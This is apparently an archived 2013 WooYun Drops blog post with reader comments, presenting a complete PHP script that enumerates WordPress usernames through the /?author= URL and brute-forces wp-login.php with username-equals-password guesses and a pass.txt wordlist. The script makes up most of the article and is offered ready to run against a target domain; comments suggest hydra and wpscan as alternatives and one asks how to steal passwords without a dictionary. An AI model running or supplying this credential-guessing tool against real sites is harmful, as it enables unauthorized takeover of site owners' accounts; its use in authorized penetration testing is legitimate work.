@@ -1,0 +1,87 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">跑wordpress用户密码脚本</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/09/17 15:04" ui-time="" datetime="2013/09/17 15:04" class="published ng-binding ng-isolate-scope">2013/09/17 15:04</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>在做渗透测试的时候，有时候会遇到一个wordpress博客，如果版本比较新，插件也没有漏洞的话，可以爆破用户名密码来尝试下。</p><p>大脑混沌情况下写的，有bug欢迎提出，由于是php的所以跑起来比较慢，下次发包还是调用命令结合hydra来爆破。</p><p>原理是通过URL <code>/?author=</code> 遍历获取用户名，然后先跑用户名与密码相同的用户，再调用同目录下pass.txt中的密码文件进行爆破。</p><p>默认获取前10个用户，可自行修改。</p><p>使用方法：</p><pre><code>php wordpress.php http://www.test.com
+</code></pre><pre><code>#!php
+&lt;?php
+
+set_time_limit(0); 
+$domain = $argv[1];
+
+//获取用户名
+for ($i=1; $i &lt;= 10; $i++) {
+
+    $url = $domain."/?author=".$i;
+    $response = httprequest($url,0);
+    if ($response == 404) {
+        continue;
+    }
+    $pattern = "/author\/(.*)\/feed/";
+    preg_match($pattern, $response, $name);
+    $namearray[] = $name[1];
+}
+
+echo "共获取用户".count($namearray)."名用户\n";
+
+echo "正在破解用户名与密码相同的用户：\n";
+
+$crackname = crackpassword($namearray,"same");
+
+$passwords = file("pass.txt");
+
+echo "正在破解弱口令用户：\n";
+
+if ($crackname) {
+    $namearray = array_diff($namearray,$crackname);
+}
+
+crackpassword($namearray,$passwords);
+
+function crackpassword($namearray,$passwords){
+    global $domain;
+    $crackname = "";
+    foreach ($namearray as $name) {
+        $url = $domain."/wp-login.php";
+        if ($passwords == "same") {
+            $post = "log=".urlencode($name)."&amp;pwd=".urlencode($name)."&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=".urlencode($domain)."%2Fwp-admin%2F&amp;testcookie=1";
+            $pos = strpos(httprequest($url,$post),'div id="login_error"');
+            if ($pos === false) {
+                echo "$name $name"."\n";
+                $crackname[] = $name;
+            }
+        }else{
+            foreach ($passwords as $pass) {
+                $post = "log=".urlencode($name)."&amp;pwd=".urlencode($pass)."&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=".urlencode($domain)."%2Fwp-admin%2F&amp;testcookie=1";
+                $pos = strpos(httprequest($url,$post),'div id="login_error"');
+                if ($pos === false) {
+                    echo "$name $pass"."\n";
+                }
+            }
+        }
+    }
+    return $crackname;
+}
+
+
+function httprequest($url,$post){
+    $ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, "$url"); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
+
+    if($post){
+        curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    }
+
+    $output = curl_exec($ch); 
+    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+
+    if ($httpcode == 404) {
+        return 404;
+    }else{
+        return $output;
+    }
+}
+?&gt;
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/501" rel="bookmark" id="re1">CVE-2012-0053详解</a></li><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re2">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/tips/125" rel="bookmark" id="re3">python脚本处理伪静态注入</a></li><li><a href="http://drops.wooyun.org/papers/1321" rel="bookmark" id="re4">wechall mysql关卡题解</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">vforbox</span> <span class="reply-time">2016-04-17 16:53:00</span></div><p></p><p>龙哥，这个脚本好眼熟...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whuxga</span> <span class="reply-time">2016-03-29 15:01:43</span></div><p></p><p>求问 知道了攻击目标的大量用户名后该怎么不用字典的盗取密码？</p><p>顺便问一下 你这个怎么用啊 我小白</p><p>php wordpress.php http://www.test.com 这个使用方法看不懂啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">myhalo</span> <span class="reply-time">2016-02-16 15:15:31</span></div><p></p><p>wpscan</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mtfly</span> <span class="reply-time">2015-08-25 15:45:42</span></div><p></p><p>@c4rp3nt3r wp的用户名获取实在是太蛋疼了，换成别的主题就又找不到。写正则太鸡肋了，你有比较好的办法么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">何仙姑</span> <span class="reply-time">2015-04-22 19:09:19</span></div><p></p><p>wordpress密码要求，最短是几位？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">debbbbie</span> <span class="reply-time">2014-11-26 23:55:09</span></div><p></p><p>能把你写的放出来吗、楼主写的确实老是出现BUG。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-06-27 17:50:37</span></div><p></p><p>$pattern = "/author\/(.*)\/feed/";<br>这个发现有的wp博客是不一样 不是完全适配，需要根据情况修改。这个是根据本地的一个情况匹配的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Viigoss</span> <span class="reply-time">2014-06-27 17:40:25</span></div><p></p><p>这正则就是个错的。这都能通过，确实可以。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路过</span> <span class="reply-time">2014-05-27 10:09:52</span></div><p></p><p>破解出来的用户密码在哪查看？测试了没有显示有</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小威</span> <span class="reply-time">2014-04-24 23:34:26</span></div><p></p><p>同求</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">二少</span> <span class="reply-time">2014-04-18 10:34:05</span></div><p></p><p>你用post-form的时候，如果是国内的站，title 如果是中文呢，你怎么来进行编码还是怎样来获取登录错误的关键字呢/?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mango</span> <span class="reply-time">2014-01-23 16:57:56</span></div><p></p><p>那该怎么办呢？？、</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2014-01-17 20:05:33</span></div><p></p><p>目测没装curl扩展</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">U神</span> <span class="reply-time">2014-01-17 19:46:26</span></div><p></p><p>Fatal error: Call to undefined function curl_init() in C:\PHP\php-5.2.12-Win32\w<br>ordpress-crack.php on line 62</p><p>求解！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lhshaoren</span> <span class="reply-time">2013-09-23 22:28:21</span></div><p></p><p>还不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2013-09-22 15:18:44</span></div><p></p><p>87</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2013-09-20 11:33:44</span></div><p></p><p>亲，我一直用hydra的http-post-form。还能多线程</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xfkxfk</span> <span class="reply-time">2013-09-18 13:03:54</span></div><p></p><p>有时候/?author=number的确找不到，不过这个找到的概率到时挺高的，支持下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4rp3nt3r</span> <span class="reply-time">2013-09-18 11:44:17</span></div><p></p><p>我上面都说了哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2013-09-18 11:24:19</span></div><p></p><p>哈，的确，忽略了登录用户名跟title的用户名可能不一样，虽然这个产生的情况很少。那你程序取用户名，是从哪里获取的呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ivan</span> <span class="reply-time">2013-09-18 03:25:50</span></div><p></p><p>收藏下~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4rp3nt3r</span> <span class="reply-time">2013-09-17 21:39:06</span></div><p></p><p>我觉得wpscan就不错，除非自己写个扫描器加入这个模块。嘿嘿。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4rp3nt3r</span> <span class="reply-time">2013-09-17 21:37:38</span></div><p></p><p>昨天我刚好也写了一个wordpress枚举用户名的小功能，楼主这个程序里面，枚举用户名的地方有问题。<br>一是 里的用户名是该用户显示的时候的名字，比如 登录用户名 admin，可以设置成 Administrator或者什么。虽然很多是一样的，这里确实不严谨。另一方面wordpress版本比较多，各种seo插件也比较多枚举用户名，只用里的信息貌似很不够，<br>还有 &lt;body class=&quot;archive author<br>以及 http://site/author/admin/<br>这种等等。<br>交流而已，没别的意思。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-09-17 17:44:56</span></div><p></p><p>wordpress太张狂了，连个验证码都不加。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccSec</span> <span class="reply-time">2013-09-17 17:07:55</span></div><p></p><p>龙哥好流逼。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2013-09-17 16:09:23</span></div><p></p><p>龙哥的东西一直很实用~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">erevus</span> <span class="reply-time">2013-09-17 15:53:27</span></div><p></p><p>好东西啊</p><p></p></div></div></div></div></div></main>
